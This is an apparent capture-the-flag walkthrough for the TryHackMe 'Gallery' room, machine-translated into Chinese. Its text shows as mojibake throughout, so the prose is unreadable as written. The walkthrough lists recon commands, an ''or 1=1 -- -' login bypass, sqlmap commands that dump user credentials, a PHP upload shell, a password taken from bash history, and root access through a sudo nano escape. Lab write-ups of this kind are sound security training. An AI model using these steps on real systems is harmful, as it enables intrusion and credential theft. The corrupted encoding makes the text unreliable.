# TryHackMe:ç”»å»Š

> åŸæ–‡ï¼š<https://infosecwriteups.com/thmgallery-25845096170d?source=collection_archive---------1----------------------->

æ¸¸æˆæ”»ç•¥

å¤§å®¶å¥½ã€‚ï¼ä¸æµªè´¹æ—¶é—´ï¼Œè®©æˆ‘ä»¬åˆ©ç”¨ç”»å»Š->

![](img/21591ae51157016552d989b8a2788c7b.png)

è®©æˆ‘ä»¬ä»æˆ‘çš„é¦–å­—æ¯å¼€å§‹

```
export IP=10.10.195.122
```

# ä¾¦å¯Ÿ

## nmap

```
nmap -sC -sV -Pn -oN nmap $IP
```

![](img/d4e9a865be4a47aa4d3b585119e81e52.png)

nmap _ ç»“æœ. txt

æˆ‘ä»¬æœ‰ä¸¤ä¸ªå¼€æ”¾çš„ç«¯å£:`80 & 8080`

ç«¯å£ 80 æœ‰é»˜è®¤çš„ Apache æœåŠ¡å™¨ç½‘é¡µã€‚

## ç›®å½•æš´åŠ›ç ´è§£

è®©æˆ‘ä»¬ä¸€èµ·å»ç©â€œæ‰é¬¼æ•¢æ­»é˜Ÿâ€:

```
gobuster dir -u $IP -w /opt/medium.txt
```

![](img/c140a20f0240d5c91042df4bc32cadc4.png)

gobuster_result.png

# å‰¥å‰Š

## SQLi

è®¿é—® http://$IP/galleryï¼Œæˆ‘ä»¬æœ‰ç™»å½•é¡µé¢

![](img/c190f55c1ae9bea5519cca312b1e603f.png)

login_page.png

*   å°è¯•äº†ä¸€äº›é»˜è®¤å¯†ç â†’æ²¡æœ‰æˆåŠŸã€‚
*   å°è¯•åŸºæœ¬ sqli è¯­æ³•â†’æˆåŠŸ

åœ¨ç”¨æˆ·åå­—æ®µä¸­

```
'or 1=1 -- -
```

å°†å¯†ç ç•™ç©ºï¼Œæˆ‘ä»¬å°±å¯ä»¥ç™»å½•äº†:)

![](img/485db2e711dfa2e7f057a738b95a0de7.png)

Post_login.png

å› æ­¤ï¼Œæœ‰ä¸€ä¸ªç®€å•çš„å›¾åƒç”»å»Šç³»ç»Ÿï¼Œå³ sqli(å‚è€ƒä¸‹æ–‡)çš„åˆ©ç”¨

![](img/8d16a4deac9417d2dffae29213653447.png)

brup.png

è®©æˆ‘ä»¬ä¿å­˜è¿™ä¸ª`right_click>save>test.req` &æŠŠå®ƒæ”¾å…¥ **sqlmap**

```
sudo sqlmap -r test.req --dbs
```

![](img/22a216ee12bd28e2ce307f57ca5d78d0.png)

sqlmap.png

æˆ‘ä»¬å‘ç°äº†ä¸¤ä¸ªæ•°æ®åº“:

![](img/2cf5e176ae264decedcf75bdf8ba6ed7.png)

database.png

ç°åœ¨å»æ‹¿æ¡Œå­:

```
sudo sqlmap -r test.req --current-db gallery_db --tables
```

![](img/86b6de263abef4db546c30ff44709a81.png)

tables.png

ç°åœ¨è·å–åˆ—:

```
sudo sqlmap -r test.req --current-db gallery_db -T users --columns
```

![](img/d48d954d0d9ed311b00325df4cc74e69.png)

åˆ—

è®©æˆ‘ä»¬è½¬å‚¨ä¸€äº›æ•°æ®

```
sudo sqlmap -r test.req --current-db gallery_db -T users -C username,password --dump
```

![](img/7432c18a12496d8248b4c15775e48cf3.png)

æˆ‘ä»¬å‘ç°äº†ç®¡ç†å“ˆå¸Œ(æˆ‘ä»¬å¯ä»¥ç ´è§£ï¼Œä½†è¿™æ˜¯ä¸€ä¸ªå…”å­æ´)

## å£³

ç»è¿‡ä¸€ç•ªå†²æµªï¼Œå‘ç°å¯ä»¥ä¸Šä¼ å›¾ç‰‡(/ä»»æ„æ–‡ä»¶)ã€‚æˆ‘å¯åŠ¨äº†æˆ‘çš„ç›‘å¬å™¨å¹¶ä¸Šä¼ äº† php æ–‡ä»¶ï¼Œæˆ‘ä»¬å¾—åˆ°äº†**å¤–å£³**

![](img/2a0aaba43f96239e931bf6287b1c45aa.png)

Shell.png

## user.txt

æˆ‘èŠ±äº†å¤§çº¦ 4 ä¸ªå¤šå°æ—¶æ¥å¯»æ‰¾å„ç§ç‰¹æƒæå‡æŠ€æœ¯ï¼Œä½†æ˜¯ä»€ä¹ˆä¹Ÿæ²¡æ‰¾åˆ°ã€‚

åæ¥æˆ‘çš„æœ‹å‹ç»™äº†æˆ‘ä¸€äº›æç¤ºï¼Œç„¶åæˆ‘åœ¨å¤‡ä»½æ–‡ä»¶å¤¹é‡Œå‘ç°äº†ä¸€äº›æœ‰è¶£çš„å‡­æ®:

![](img/720a2c3d0edcce6318745bedb35b3572.png)

å…”å­æ´. png

å†è¯´ä¸€æ¬¡ï¼Œè¿™äº›åªæ˜¯å…”å­æ´ï¼Œæ²¡å…³ç³»ã€‚

æˆ‘ä»¬ç»§ç»­ï¼Œåæ¥æˆ‘å‘ç°äº†ã€‚bash _ å†å²

![](img/345ffca0cc51533de66d562515144613.png)

ã€‚bash_history.png

è¿™é‡Œæ‚¨å¯ä»¥çœ‹åˆ°ç”¨æˆ· mike çš„å¯†ç ã€‚

```
su mike
```

è¾“å…¥å¯†ç ï¼Œæˆ‘ä»¬æ˜¯è¿ˆå…‹Â·:D

![](img/cf7a2878784d32e97ef7be2f1392f929.png)

user.txt.png

# æ ¹

## root.txt

è·‘ç€`sudo -l`ï¼Œæˆ‘ä»¬å‘ç°

![](img/f7e33eb9631ad3c183df64e91ae37abc.png)

é¡»å²›å¿

ç”¨æˆ· mike å¯ä»¥ sudo èº«ä»½è¿è¡Œ/opt/rookit.sh æ–‡ä»¶

è®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶:

![](img/819740fa661b6daed498a591cf7afdbe.png)

å—¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ nano è®¿é—® escï¼ŒæŸ¥çœ‹ GTFObins

```
sudo /bin/bash /opt/rootkit.sh
```

![](img/c08554a0d977bb9273e573b2a78630f2.png)

çº³ç±³ç§äºº ECS technique.png

ä¹‹åéƒ½æ˜¯ urs:)

![](img/56de5c7d5a16d399bad55d7177ea297b.png)

root.txt

æ„Ÿè°¢æ‚¨é˜…è¯»æœ¬æ–‡ã€‚å¸Œæœ›ä½ å–œæ¬¢ã€‚

# å‚è€ƒèµ„æ–™:

|| [ç½‘ç«™](https://namx05.github.io/)|[Twitter](https://twitter.com/namx05)|[GTFObins](https://gtfobins.github.io/)|[THM Room](https://tryhackme.com/room/gallery666)|[SQLi exploit](https://www.exploit-db.com/exploits/50198)| |

# ğŸ”ˆ ğŸ”ˆInfosec Writeups æ­£åœ¨ç»„ç»‡å…¶é¦–æ¬¡è™šæ‹Ÿä¼šè®®å’Œç½‘ç»œæ´»åŠ¨ã€‚å¦‚æœä½ å¯¹ä¿¡æ¯å®‰å…¨æ„Ÿå…´è¶£ï¼Œè¿™æ˜¯æœ€é…·çš„åœ°æ–¹ï¼Œæœ‰ 16 ä¸ªä»¤äººéš¾ä»¥ç½®ä¿¡çš„æ¼”è®²è€…å’Œ 10 å¤šä¸ªå°æ—¶å……æ»¡åŠ›é‡çš„è®¨è®ºä¼šè®®ã€‚[æŸ¥çœ‹æ›´å¤šè¯¦æƒ…å¹¶åœ¨æ­¤æ³¨å†Œã€‚](https://iwcon.live/)

[](https://iwcon.live/) [## IWCon2022 - Infosec ä¹¦é¢æŠ¥å‘Šè™šæ‹Ÿä¼šè®®

### ä¸ä¸–ç•Œä¸Šæœ€ä¼˜ç§€çš„ä¿¡æ¯å®‰å…¨ä¸“å®¶å»ºç«‹è”ç³»ã€‚äº†è§£ç½‘ç»œå®‰å…¨ä¸“å®¶å¦‚ä½•å–å¾—æˆåŠŸã€‚å°†æ–°æŠ€èƒ½æ·»åŠ åˆ°æ‚¨çš„â€¦

iwcon.live](https://iwcon.live/)